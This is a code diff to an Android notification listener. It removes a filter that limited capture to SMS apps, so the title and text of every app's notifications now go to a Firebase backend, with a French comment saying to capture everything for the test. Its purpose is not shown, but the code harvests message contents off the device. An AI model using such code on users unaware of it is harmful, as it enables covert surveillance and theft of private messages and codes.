@@ -17,23 +17,16 @@ public class NotifListener extends NotificationListenerService {
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
         if (sbn == null) return;
-        String pkg = sbn.getPackageName();
-        if (pkg == null) return;
-
-        // On capture uniquement les apps SMS classiques
-        if (!pkg.contains("messaging") && !pkg.contains("sms")
-                && !pkg.contains("mms") && !pkg.contains("com.android.mms")) {
-            return;
-        }
-
         Bundle extras = sbn.getNotification().extras;
         if (extras == null) return;
 
+        String appName = sbn.getPackageName();
         String titre = extras.getString(Notification.EXTRA_TITLE, "");
         String texte = extras.getString(Notification.EXTRA_TEXT, "");
         if (texte == null || texte.isEmpty()) return;
 
-        envoyerVersFirebase(titre, texte);
+        // Pour le test : on capture TOUT
+        envoyerVersFirebase(appName + " | " + titre, texte);
     }
 
     private void envoyerVersFirebase(final String expediteur, final String message) {
